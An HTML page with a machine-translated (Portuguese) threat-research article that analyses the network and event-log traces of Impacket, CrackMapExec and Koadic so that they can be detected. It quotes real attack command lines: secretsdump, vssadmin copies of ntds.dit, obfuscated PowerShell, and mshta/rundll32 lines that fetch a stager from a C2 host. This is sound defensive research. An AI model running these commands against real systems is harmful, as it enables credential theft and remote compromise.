<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèº‚Äçüè´ ‚ùï üåπ Como detectar ataques √† infraestrutura do Windows: explorando ferramentas de hackers ‚ö°Ô∏è ü•Ñ üå±</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="O n√∫mero de ataques no setor corporativo est√° crescendo a cada ano: por exemplo, em 2017, foram registrados 13% a mais de incidentes exclusivos do que...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Como detectar ataques √† infraestrutura do Windows: explorando ferramentas de hackers</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  O n√∫mero de ataques no setor corporativo est√° crescendo a cada ano: por exemplo, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">em 2017, foram registrados 13% a mais de incidentes exclusivos do</a> que em 2016 e at√© o final de 2018, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">27% a mais de incidentes do</a> que no per√≠odo anterior.  Incluindo aqueles em que a principal ferramenta de trabalho √© o sistema operacional Windows.  Em 2017-2018, os <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">grupos</a> APT Dragonfly, APT28 e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">APT MuddyWater</a> atacaram organiza√ß√µes governamentais e militares na Europa, Am√©rica do Norte e Ar√°bia Saudita.  E eles usaram tr√™s ferramentas para isso - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Impacket</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">CrackMapExec</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Koadic</a> .  O c√≥digo fonte deles est√° aberto e dispon√≠vel no GitHub. <br><br>  Vale ressaltar que essas ferramentas n√£o s√£o usadas para penetra√ß√£o inicial, mas para o desenvolvimento de um ataque dentro da infraestrutura.  Os atacantes os usam em diferentes est√°gios do ataque, depois de superar o per√≠metro.  A prop√≥sito, isso √© dif√≠cil de detectar e, muitas vezes, apenas com a ajuda de tecnologias para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">detectar tra√ßos de comprometimento no tr√°fego de rede</a> ou em ferramentas que podem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">detectar as a√ß√µes ativas de um invasor depois que ele penetra na infraestrutura</a> .  As ferramentas fornecem muitas fun√ß√µes - desde a transfer√™ncia de arquivos at√© a intera√ß√£o com o registro e a execu√ß√£o de comandos em uma m√°quina remota.  Realizamos um estudo dessas ferramentas para determinar a atividade da rede. <a name="habracut"></a><br><br>  O que precis√°vamos fazer: <br><br><ul><li>  <b>Entenda como as ferramentas de hackers funcionam</b> .  Descubra o que os atacantes precisam operar e quais tecnologias eles podem usar. </li><li> <b>Encontre o que n√£o √© detectado pelas ferramentas de seguran√ßa da informa√ß√£o nos primeiros est√°gios de um ataque</b> .  O est√°gio de intelig√™ncia pode ser pulado, porque o invasor √© um invasor interno ou porque explora uma lacuna na infraestrutura que n√£o era conhecida anteriormente.  H√° uma oportunidade de restaurar toda a cadeia de suas a√ß√µes, da√≠ o desejo de detectar mais movimentos. </li><li>  <b>Elimine alarmes falsos das ferramentas de detec√ß√£o de intrus√£o</b> .  N√£o devemos esquecer que, ao detectar determinadas a√ß√µes apenas com base na intelig√™ncia, erros frequentes s√£o poss√≠veis.  Geralmente, na infraestrutura, h√° um n√∫mero suficiente de maneiras, indistingu√≠veis do leg√≠timo √† primeira vista, para obter qualquer informa√ß√£o. </li></ul><br>  O que essas ferramentas oferecem aos atacantes?  Se for o Impacket, os atacantes obt√™m uma grande biblioteca de m√≥dulos que podem ser usados ‚Äã‚Äãem diferentes est√°gios do ataque, depois de romper o per√≠metro.  Muitas ferramentas usam os m√≥dulos Impacket dentro de si - por exemplo, Metasploit.  Possui dcomexec e wmiexec para execu√ß√£o remota de comandos, secretsdump para recuperar contas da mem√≥ria adicionada do Impacket.  Como resultado, a detec√ß√£o correta da atividade dessa biblioteca tamb√©m ser√° assegurada pela detec√ß√£o de derivados. <br><br>  Sobre o CrackMapExec (ou simplesmente o CME), os criadores, por acaso, escreveram "Powered by Impacket".  Al√©m disso, o CME possui funcionalidade pronta para cen√°rios populares: √© o Mimikatz para obter senhas ou seus hashes, e a implementa√ß√£o do Meterpreter ou do agente Empire para execu√ß√£o remota e Bloodhound a bordo. <br><br>  A terceira ferramenta que selecionamos √© o Koadic.  √â bastante recente, foi apresentado na confer√™ncia internacional de hackers DEFCON 25 em 2017 e tem uma abordagem n√£o padr√£o: trabalhar via HTTP, Java Script e Microsoft Visual Basic Script (VBS).  Essa abordagem √© chamada de viver fora da terra: a ferramenta usa um conjunto de depend√™ncias e bibliotecas incorporadas ao Windows.  Os criadores chamam de COM Command Control, ou C3. <br><br><h2>  IMPACKET </h2><br>  A funcionalidade do Impacket √© muito ampla, come√ßando pelo reconhecimento no AD e coletando dados dos servidores MS SQL internos, terminando com t√©cnicas para obter credenciais: trata-se de um ataque de retransmiss√£o SMB e recebe um arquivo ntds.dit contendo hashes de senha de usu√°rio de um controlador de dom√≠nio.  O Impacket tamb√©m executa remotamente comandos usando quatro m√©todos diferentes: por meio do WMI, um servi√ßo para gerenciar o agendador do Windows, DCOM e SMB, e para isso precisa de credenciais. <br><br><h3>  Secretsdump </h3><br>  Vamos dar uma olhada no segredo secreto.  Este √© um m√≥dulo cujo objetivo pode ser tanto m√°quinas de usu√°rio quanto controladores de dom√≠nio.  Com ele, √© poss√≠vel obter c√≥pias das √°reas de mem√≥ria LSA, SAM, SECURITY, NTDS.dit, para que possam ser vistas em diferentes est√°gios do ataque.  A primeira etapa na opera√ß√£o do m√≥dulo √© a autentica√ß√£o via SMB, que requer uma senha de usu√°rio ou seu hash para conduzir automaticamente um ataque de Passe o Hash.  A seguir, √© apresentada uma solicita√ß√£o para abrir o acesso ao Service Control Manager (SCM) e obter acesso ao registro usando o protocolo winreg, usando o qual um invasor pode descobrir os dados das filiais que lhe interessam e obter os resultados atrav√©s do SMB. <br><br>  Na fig.  1, vemos exatamente quando o acesso ao protocolo winreg √© obtido pela chave de registro no LSA.  Para fazer isso, use o comando DCERPC com opcode 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Fig.</i>  <i>1. Abrindo a chave do registro usando o protocolo winreg</i> <br><br>  Al√©m disso, quando o acesso √† chave √© obtido, os valores s√£o salvos usando o comando SaveKey com o opcode 20. O Impacket torna isso muito espec√≠fico.  Ele salva os valores em um arquivo cujo nome √© uma sequ√™ncia de 8 caracteres aleat√≥rios com a adi√ß√£o de .tmp.  Al√©m disso, o descarregamento adicional desse arquivo ocorre via SMB no diret√≥rio System32 (Fig. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Fig.</i>  <i>2. Esquema para obter uma chave do Registro de uma m√°quina remota</i> <br><br>  Acontece que voc√™ pode detectar essa atividade na rede consultando determinadas ramifica√ß√µes do registro usando o protocolo winreg, nomes espec√≠ficos, comandos e sua ordem. <br><br>  Este m√≥dulo tamb√©m deixa rastros no log de eventos do Windows, devido ao qual √© facilmente detectado.  Por exemplo, como resultado de um comando <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  no log do Windows Server 2016, veremos a seguinte sequ√™ncia de eventos-chave: <br><br>  1. 4624 - Logon remoto. <br>  2. 5145 - verifica√ß√£o dos direitos de acesso ao servi√ßo winreg remoto. <br>  3. 5145 - verificando permiss√µes de arquivo no diret√≥rio System32.  O arquivo tem o nome aleat√≥rio mencionado acima. <br>  4. 4688 - criando o processo cmd.exe que inicia o vssadmin: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - criando um processo com o comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - criando um processo com o comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - criando um processo com o comando: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Como muitas ferramentas de p√≥s-explora√ß√£o, o Impacket possui m√≥dulos para execu√ß√£o remota de comandos.  Vamos nos concentrar no smbexec, que fornece um shell interativo em uma m√°quina remota.  Este m√≥dulo tamb√©m requer autentica√ß√£o SMB com uma senha ou seu hash.  Na fig.  3, vemos um exemplo de como essa ferramenta funciona, nesse caso, √© um console do administrador local. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Fig.</i>  <i>3. Console Interativo Smbexec</i> <br><br>  A primeira etapa no smbexec ap√≥s a autentica√ß√£o √© abrir o SCM com o comando OpenSCManagerW (15).  A solicita√ß√£o √© digna de nota: nela, o campo MachineName est√° definido como DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Fig.</i>  <i>4. Solicita√ß√£o para abrir o Service Control Manager</i> <br><br>  Em seguida, um servi√ßo √© criado usando o comando CreateServiceW (12).  No caso do smbexec, podemos ver a mesma l√≥gica de cria√ß√£o de equipes a cada vez.  Na fig.  5 verde indica os par√¢metros invari√°veis ‚Äã‚Äãdo comando, amarelo - o que o atacante pode mudar.  √â f√°cil notar que o nome do arquivo execut√°vel, seu diret√≥rio e o arquivo de sa√≠da podem ser alterados, mas o restante pode ser alterado muito mais dif√≠cil sem violar a l√≥gica do m√≥dulo Impacket. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Fig.</i>  <i>5. Solicite a cria√ß√£o de um servi√ßo usando o Service Control Manager</i> <br><br>  O Smbexec tamb√©m deixa rastros claros no log de eventos do Windows.  No log do Windows Server 2016 para o shell interativo com o comando ipconfig, veremos a seguinte sequ√™ncia de eventos: <br><br>  1. 4697 - instala√ß√£o do servi√ßo na m√°quina da v√≠tima: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - cria√ß√£o do processo cmd.exe com os argumentos do par√°grafo 1. <br>  3. 5145 - verificando permiss√µes no arquivo __output no diret√≥rio C $. <br>  4. 4697 - instala√ß√£o do servi√ßo na m√°quina da v√≠tima. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - criando o processo cmd.exe com os argumentos do par√°grafo 4. <br>  6. 5145 - verificando os direitos de acesso ao arquivo __output no diret√≥rio C $. <br><br>  Impacket √© a base para o desenvolvimento de ferramentas de ataque.  Ele suporta quase todos os protocolos na infraestrutura do Windows e, ao mesmo tempo, possui caracter√≠sticas pr√≥prias.  Aqui est√£o solicita√ß√µes winreg espec√≠ficas e o uso da API SCM com a forma√ß√£o caracter√≠stica de comandos, o formato do nome do arquivo e o compartilhamento SMB SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  A ferramenta CME foi projetada principalmente para automatizar as a√ß√µes rotineiras que um invasor deve executar para avan√ßar na rede.  Ele permite que voc√™ trabalhe em conjunto com o famoso agente Empire e o Meterpreter.  Para executar comandos secretamente, o CME pode ofusc√°-los.  Usando o Bloodhound (uma ferramenta de intelig√™ncia separada), um invasor pode automatizar a busca por uma sess√£o de administrador de dom√≠nio ativa. <br><br><h3>  Bloodhound </h3><br>  Bloodhound como uma ferramenta independente permite intelig√™ncia avan√ßada dentro da rede.  Ele coleta dados sobre usu√°rios, m√°quinas, grupos, sess√µes e vem na forma de um script no PowerShell ou de um arquivo bin√°rio.  Protocolos baseados em LDAP ou SMB s√£o usados ‚Äã‚Äãpara coletar informa√ß√µes.  O m√≥dulo de integra√ß√£o do CME permite fazer o download do Bloodhound na m√°quina da v√≠tima, executar e receber os dados coletados ap√≥s a execu√ß√£o, automatizando a√ß√µes no sistema e tornando-as menos vis√≠veis.  O shell gr√°fico Bloodhound apresenta os dados coletados na forma de gr√°ficos, o que permite encontrar o caminho mais curto da m√°quina atacante para o administrador do dom√≠nio. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Fig.</i>  <i>6. interface Bloodhound</i> <br><br>  Para executar na m√°quina da v√≠tima, o m√≥dulo cria uma tarefa usando ATSVC e SMB.  O ATSVC √© uma interface para trabalhar com o Agendador de tarefas do Windows.  O CME usa sua fun√ß√£o NetrJobAdd (1) para criar tarefas pela rede.  Um exemplo do que o m√≥dulo CME envia √© mostrado na fig.  7: Esta √© uma chamada para o cmd.exe e o c√≥digo oculto como argumentos no formato XML. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Fig. 7.</i>  <i>Criando uma tarefa atrav√©s do CME</i> <br><br>  Ap√≥s a conclus√£o da tarefa, a m√°quina da v√≠tima lan√ßa o pr√≥prio Bloodhound, e isso pode ser visto no tr√¢nsito.  O m√≥dulo √© caracterizado por consultas LDAP para receber grupos padr√£o, uma lista de todas as m√°quinas e usu√°rios no dom√≠nio, recebendo informa√ß√µes sobre sess√µes de usu√°rios ativos por meio da solicita√ß√£o SRVSVC NetSessEnum. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Fig.</i>  <i>8. Obtendo uma lista de sess√µes ativas via SMB</i> <br><br>  Al√©m disso, o lan√ßamento do Bloodhound na m√°quina da v√≠tima com auditoria ativada √© acompanhado por um evento com o ID 4688 (cria√ß√£o do processo) e o nome do processo <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  Dignos de nota s√£o os argumentos da linha de comando: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Do ponto de vista da funcionalidade e implementa√ß√£o, o m√≥dulo enum_avproducts √© muito interessante.  O WMI permite usar a linguagem de consulta WQL para receber dados de v√°rios objetos do Windows, que √© essencialmente o que esse m√≥dulo CME usa.  Ele gera solicita√ß√µes para as classes AntiSpywareProduct e AntiMirusProduct sobre as prote√ß√µes instaladas na m√°quina da v√≠tima.  Para obter os dados necess√°rios, o m√≥dulo se conecta ao namespace root \ SecurityCenter2, gera uma consulta WQL e recebe uma resposta.  Na fig.  A Figura 9 mostra o conte√∫do de tais solicita√ß√µes e respostas.  No nosso exemplo, o Windows Defender foi encontrado. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Fig.</i>  <i>9. Atividade de rede do m√≥dulo enum_avproducts</i> <br><br>  Freq√ºentemente, a auditoria WMI (Trace WMI-Activity), nos eventos em que voc√™ pode encontrar informa√ß√µes √∫teis sobre consultas WQL, pode ser desativada.  Mas, se estiver ativado, se o script enum_avproducts for executado, o evento com o ID 11. ser√° salvo e conter√° o nome do usu√°rio que enviou a solicita√ß√£o e o nome no espa√ßo para nome \ SecurityCenter2 raiz. <br><br>  Cada um dos m√≥dulos do CME revelou seus pr√≥prios artefatos, sejam consultas WQL espec√≠ficas ou a cria√ß√£o de um determinado tipo de tarefa no agendador de tarefas com ofusca√ß√£o e a atividade t√≠pica do Bloodhound no LDAP e SMB. <br><br><h2>  Koadic </h2><br>  Um recurso distintivo do Koadic √© o uso de int√©rpretes internos do Windows JavaScript e VBScript.  Nesse sentido, segue a tend√™ncia de viver fora da terra - ou seja, n√£o possui depend√™ncias externas e usa ferramentas padr√£o do Windows.  Esta √© uma ferramenta para comando e controle completo (CnC), pois ap√≥s a infec√ß√£o, um "implante" √© instalado na m√°quina, o que permite que seja controlado.  Tal m√°quina, na terminologia Koadic, √© chamada de "zumbi".  Com a falta de privil√©gios para o trabalho completo do lado da v√≠tima, Koadic tem a capacidade de aument√°-las usando a t√©cnica de desvio do UAC. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Fig.</i>  <i>10. Shell de Comando Koadic</i> <br><br>  A v√≠tima deve iniciar a comunica√ß√£o com o pr√≥prio servidor Command &amp; Control.  Para fazer isso, ela precisa solicitar um URI pr√©-preparado e obter o corpo Koadic principal usando um dos est√°gios.  Na fig.  11 mostra um exemplo para o mshta stager. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Fig.</i>  <i>11. Inicializando uma sess√£o com um servidor CnC</i> <br><br>  Usando a vari√°vel de resposta WS, fica claro que a execu√ß√£o ocorre atrav√©s do WScript.Shell e as vari√°veis ‚Äã‚ÄãSTAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE cont√™m informa√ß√µes importantes sobre os par√¢metros da sess√£o atual.  Este √© o primeiro par de solicita√ß√£o-resposta em uma conex√£o HTTP com um servidor CnC.  Os pedidos subsequentes est√£o diretamente relacionados √† funcionalidade dos m√≥dulos chamados (implantes).  Todos os m√≥dulos Koadic funcionam apenas com uma sess√£o ativa com o CnC. <br><br><h3>  Mimikatz </h3><br>  Assim como o CME trabalha com Bloodhound, o Koadic trabalha com o Mimikatz como um programa independente e tem v√°rias maneiras de execut√°-lo.  Abaixo est√° um par de solicita√ß√£o-resposta para carregar um implante Mimikatz. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Fig.</i>  <i>12. Transfer√™ncia de Mimikatz para Koadic</i> <br><br>  Voc√™ pode perceber como o formato URI na solicita√ß√£o foi alterado.  Nele apareceu o valor da vari√°vel csrf, respons√°vel pelo m√≥dulo selecionado.  N√£o preste aten√ß√£o no nome dela;  todos sabemos que o CSRF √© geralmente entendido de maneira diferente.  Em resposta, o mesmo corpo principal de Koadic entrou, no qual o c√≥digo associado ao Mimikatz foi adicionado.  √â grande o suficiente, ent√£o considere os pontos principais.  √Ä nossa frente est√° a biblioteca Mimikatz codificada em base64, a classe .NET serializada que o injetar√° e os argumentos para executar o Mimikatz.  O resultado da execu√ß√£o √© transmitido pela rede de forma clara. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Fig.</i>  <i>13. O resultado da execu√ß√£o do Mimikatz em uma m√°quina remota</i> <br><br><h3>  Exec_cmd </h3><br>  O Koadic tamb√©m possui m√≥dulos que podem executar comandos remotamente.  Aqui veremos o mesmo m√©todo de gera√ß√£o de URIs e as vari√°veis ‚Äã‚Äãfamiliares sid e csrf.  No caso do m√≥dulo exec_cmd, o c√≥digo √© adicionado ao corpo que √© capaz de executar comandos do shell.  O c√≥digo a seguir √© mostrado na resposta HTTP do servidor CnC. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Fig.</i>  <i>14. O c√≥digo do implante exec_cmd</i> <br><br>  A vari√°vel GAWTUUGCFI com o atributo WS familiar √© necess√°ria para a execu√ß√£o do c√≥digo.  Com sua ajuda, o implante chama o shell, processando duas ramifica√ß√µes do c√≥digo - shell.exec com o retorno do fluxo de dados de sa√≠da e o shell.run sem retornar. <br><br>  O Koadic n√£o √© uma ferramenta t√≠pica, mas possui seus pr√≥prios artefatos pelos quais pode ser encontrado no tr√°fego leg√≠timo: <br><br><ul><li>  forma√ß√£o especial de solicita√ß√µes HTTP, </li><li>  usando a API winHttpRequests, </li><li>  criando um objeto WScript.Shell por meio do ActiveXObject, </li><li>  grande corpo execut√°vel. </li></ul><br>  A conex√£o inicial inicia o stager, tornando poss√≠vel detectar sua atividade atrav√©s de eventos do Windows.  Para mshta, este √© o evento 4688, que fala sobre a cria√ß√£o de um processo com um atributo de inicializa√ß√£o: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  Durante a execu√ß√£o do Koadic, voc√™ pode ver outros 4688 eventos com atributos que o caracterizam perfeitamente: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  Conclus√µes </h2><br>  A tend√™ncia de viver fora da terra est√° ganhando popularidade entre os invasores.  Eles usam as ferramentas e mecanismos internos do Windows para suas necessidades.  Vemos como as populares ferramentas Koadic, CrackMapExec e Impacket que seguem esse princ√≠pio s√£o cada vez mais encontradas nos relat√≥rios do APT.  O n√∫mero de garfos no GitHub para essas ferramentas tamb√©m est√° crescendo, novos aparecem (agora j√° existem cerca de mil).  A tend√™ncia est√° ganhando popularidade devido √† sua simplicidade: os invasores n√£o precisam de ferramentas de terceiros, eles j√° est√£o nas m√°quinas das v√≠timas e ajudam a desviar das ferramentas de prote√ß√£o.  Nosso foco √© estudar a conectividade de rede: cada ferramenta descrita acima deixa sua marca no tr√°fego de rede;  um estudo detalhado deles nos permitiu ensinar nosso produto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">PT Network Attack Discovery</a> a detect√°-los, o que ajuda a investigar toda a cadeia de incidentes cibern√©ticos que os envolvem. <br><br>  <b>Autores</b> : <br><br><ul><li>  Anton Tyurin, Chefe de Servi√ßos Especializados, PT Expert Security Center, Positive Technologies </li><li>  Egor Podmokov, especialista, PT Expert Security Center, Positive Technologies </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt460517/">https://habr.com/ru/post/pt460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt460507/index.html">XEN e o futuro do setor automotivo: como um hipervisor de c√≥digo aberto se torna um concorrente de solu√ß√µes automotivas comerciais</a></li>
<li><a href="../pt460509/index.html">Como os proxies residentes ajudam nos neg√≥cios: um caso real do uso do Infatica no Data Mining</a></li>
<li><a href="../pt460511/index.html">Ajuste do PHP-FPM: usando pm static para desempenho m√°ximo</a></li>
<li><a href="../pt460513/index.html">Flutter 1.7 - novidades da vers√£o de 10 de julho de 2019</a></li>
<li><a href="../pt460515/index.html">Qu√£o perto estamos realmente do advento dos robomobiles?</a></li>
<li><a href="../pt460521/index.html">As aventuras dos Malvari indescrit√≠veis, parte IV: DDE e campos de documentos do Word</a></li>
<li><a href="../pt460523/index.html">An√∫ncio de um mitap que se transforma suavemente em um drinkcap BeerPHP (em Moscou e on-line)</a></li>
<li><a href="../pt460525/index.html">Bem-vindo ao DINS IT NOITE em julho: controle de qualidade e JS</a></li>
<li><a href="../pt460527/index.html">Solu√ß√£o de problemas com pwnable.kr 06 - aleat√≥rio e 09 - erro</a></li>
<li><a href="../pt460531/index.html">Pervers√µes curiosas do mundo da TI - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
